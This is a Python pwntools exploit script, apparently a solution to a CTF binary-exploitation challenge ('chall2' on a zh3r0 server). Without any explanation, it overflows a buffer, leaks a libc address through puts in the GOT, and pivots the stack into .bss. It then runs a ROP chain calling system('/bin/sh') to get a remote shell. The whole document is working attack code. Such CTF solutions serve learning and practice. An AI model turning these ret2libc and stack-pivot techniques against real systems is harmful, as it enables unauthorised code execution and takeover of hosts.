from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall2'
HOST = 'asia.pwn.zh3r0.ml'
PORT = 7412

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x779])

rdi = 0x00400943
rsi_p1 = 0x400941
bss = 0x601100
leave = 0x004007d5
for i in range(4):
    r.recvuntil('.\n')

r.sendafter('.\n', 'A'*0x28+'\x17')
payload = ''
payload += flat(0x1, 0x2, rdi, elf.got.puts, elf.plt.puts, elf.sym.finallyyouhelpedme)
payload = payload.ljust(0x64)
r.sendafter('.\n', payload)

payload = 'A'*0x20
payload += flat(bss+8, leave)
# r.sendafter('.\n', '/bin/sh')
r.sendafter('? \n', payload)
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg('leak')
base = leak - 0x809c0
system = base + 0x4f440
binsh = base + 0x1b3e9a

payload = ''
payload += p64(0x400755)
payload = payload.ljust(0x64)
r.send(payload)

payload = ''
payload = 'A'*0x20
payload += flat(bss+0x708, elf.sym.finallyyouhelpedme+8)
payload = payload.ljust(0x40)
r.sendafter('? \n', payload)

payload = ''
payload += 'B'
r.send(payload)

payload = ''
payload += flat(0xdeadbeef, 0xc0bebeef, 1, 2, 3, rdi, binsh, system)
payload = payload.ljust(0x40)
r.sendafter('? \n', payload)

r.interactive()


